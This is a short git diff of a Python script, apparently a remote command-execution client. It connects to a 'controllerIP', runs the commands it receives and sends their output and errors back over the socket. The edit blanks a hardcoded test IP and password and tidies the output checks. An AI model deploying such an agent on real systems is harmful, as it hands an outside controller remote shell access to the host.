@@ -15,11 +15,10 @@ Author: Asa Horn
 ############################################################helper functions
 
 
-
 ###############################################################Main
 def main(*args):
-    controllerIP = '127.0.0.1'
-    password = 'testingPasswordPlzRemove'
+    controllerIP = ''
+    password = ''
 
     if password == '':
         if len(args) > 1:
@@ -75,12 +74,12 @@ def main(*args):
                         stderr = 'Error: OS does not like file path specified. Check it and try again'
 
                     print('sending back """\n' + stdout.decode("utf-8"), stderr.decode("utf-8"), '"""\n\n')
-                    if stderr != b'':
+                    if stderr:
                         conn.sendall(stderr)
                     else:
                         conn.sendall(b'no errors')
-
-                    if stdout != b'':
+                        
+                    if stdout:
                         conn.sendall(stdout)
                     else:
                         conn.sendall(b'no output')
